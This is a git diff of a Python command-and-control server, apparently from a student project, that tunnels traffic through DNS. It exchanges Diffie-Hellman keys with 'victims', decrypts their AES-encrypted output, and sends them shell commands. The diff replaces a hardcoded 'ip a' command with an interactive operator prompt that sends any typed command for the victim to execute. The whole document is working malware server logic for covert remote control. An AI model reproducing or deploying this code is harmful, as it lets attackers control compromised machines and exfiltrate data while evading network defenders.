@@ -4,7 +4,6 @@ Naor Maman        207341777
 """
 import binascii
 import base64
-from threading import Thread
 
 import pyDH as pyDH
 from Crypto.Cipher import AES
@@ -72,15 +71,15 @@ def attack(request: DNSQR):
         send_response(request, err_ans)
 
     elif cmd_code in [CLIENT_COMMANDS['ok&ans'], CLIENT_COMMANDS['ok&retransmission']]:
-        print('ok&ans OR ok&retransmission')
+        # print('ok&ans OR ok&retransmission')
         send_command(request, identify, cmd_code, enc_data)
 
     elif cmd_code == CLIENT_COMMANDS['more']:
-        print('more')
+        # print('more')
         get_first_part(request, identify, enc_data)
 
     elif cmd_code == CLIENT_COMMANDS['next']:
-        print('next')
+        # print('next')
         get_next_part(request, identify, enc_data)
 
     elif cmd_code == CLIENT_COMMANDS['last']:
@@ -88,29 +87,25 @@ def attack(request: DNSQR):
         global stat_code
 
         if stat_code == CLIENT_COMMANDS['keyExchange1']:
-            print('keyExchange1')
+            # print('keyExchange1')
             bytes_victim_dh_pubkey = base64.b32decode(stat_data + enc_data)
             key_exchange1(request, identify, bytes_victim_dh_pubkey)
 
         else:
-            print('last part')
+            # print('last part')
             try:
-                print('[!] stat_data + enc_data:\n', stat_data + enc_data)
                 data = decode_msg(identify, stat_data + enc_data)
             except binascii.Error:
                 err_ans = build_response(identify, SERVER_COMMANDS['error&retransmission'], b'wrong code - no last')
                 send_response(request, err_ans)
             else:
-                print('identify:', identify, ' | code:', stat_code, ' | all data:\n', data)
-                response_data = build_response(identify, SERVER_COMMANDS['ok&sleep'], b'5')
-                send_response(request, response_data)
-                # input("Enter next command to be sent to client: ")
+                send_next_command(request, identify, data)
 
         stat_data = b''
         stat_code = 0
 
     elif cmd_code == CLIENT_COMMANDS['keyExchange3']:
-        print('keyExchange3')
+        # print('keyExchange3')
         key_exchange3(request, identify, enc_data)
 
     elif cmd_code == CLIENT_COMMANDS['ok&continue'] and need_2_send:
@@ -119,24 +114,22 @@ def attack(request: DNSQR):
         send_next_part(request, identify)
 
     elif cmd_code == CLIENT_COMMANDS['awake']:
-        print('victim awake')
-        send_next_command(request, identify)
+        # print('victim awake')
+        send_next_command(request, identify, "")
 
 
 # region protocol parts functions
 def send_command(request: DNSQR, identify: bytes, ans_code: int, enc_data: bytes):
     """
-    Send the next command to the victim
+    Send the next command to the victim.
+
     :param request: the DNS request query from victim.
     :param identify: victim identify number
     :param ans_code: victim client code
     :param enc_data: victim encoded data
     """
-    global input_buffer
     data = decode_msg(identify, enc_data)
-    # print('answer from ', identify, ' with code ', ans_code, ':\n', data)
-    print(data)
-    send_next_command(request, identify)
+    send_next_command(request, identify, data)
 
 
 def send_next_part(request: DNSQR, identify: bytes):
@@ -220,28 +213,31 @@ def key_exchange3(request: DNSQR, identify: bytes, enc_victim_os: bytes):
     connected_victims[identify].append(victim_os)
     print("[!] New victim is connected!")
 
-    print(f"[!] {identify} OS type: {connected_victims[identify][-1]}")
-    send_next_command(request, identify)
+    print(f"[!] {identify} shared key: {connected_victims[identify][0].decode()} OS type: {connected_victims[identify][-1]}")
+    send_next_command(request, identify, "")
 
 
 # endregion
 
-def send_next_command(request: DNSQR, identify: bytes):
+def send_next_command(request: DNSQR, identify: bytes, data: str):
     """
+    Save the output from prev command in global var,
+    Read the next command from the global input var and send it to victim.
+    if no command in global var - send victim to sleep.
+
     :param request: the DNSQR paket from victim
     :param identify: victim identify number
+    :param data: the output data from prev command
     """
-    # global input_buffer
-    #
-    # if input_buffer != '':
-    #     response_data = build_response(identify, SERVER_COMMANDS['ok&process'], input_buffer.encode())
-    #     input_buffer = ''
-    # else:
-    #     print("[!]send him to sleep!")
-    #     response_data = build_response(identify, SERVER_COMMANDS['ok&sleep'], b'5')
-    # send_response(request, response_data)
-    print('send `ip a`')
-    response_data = build_response(identify, SERVER_COMMANDS['ok&process'], b'ip a')
+    global input_buffer
+
+    print(data)
+    if input_buffer != "":
+        response_data: bytes = build_response(identify, SERVER_COMMANDS['ok&process'], input_buffer.encode())
+        input_buffer = ""
+    else:
+        response_data: bytes = build_response(identify, SERVER_COMMANDS['ok&sleep'], b'5')
+
     send_response(request, response_data)
 
 
@@ -407,7 +403,6 @@ def decode_msg(identify, encrypted_msg: bytes) -> str:
     """
 
     base32_msg = base64.b32decode(encrypted_msg)  # decode the response
-    print(identify, connected_victims[identify])
     if identify in connected_victims:
         # we decrypt the msg iff we already exchanged the key and we have the decrypting object
         decrypting = cipher_obj(connected_victims[identify][0])
@@ -417,7 +412,14 @@ def decode_msg(identify, encrypted_msg: bytes) -> str:
 
 
 def main():
-    run()
+    global input_buffer
+
+    t1 = Thread(target=run)
+    t1.start()
+
+    while True:
+        if connected_victims and input_buffer == "":
+            input_buffer = input("enter the next command to perform:\n")
 
 
 if __name__ == "__main__":
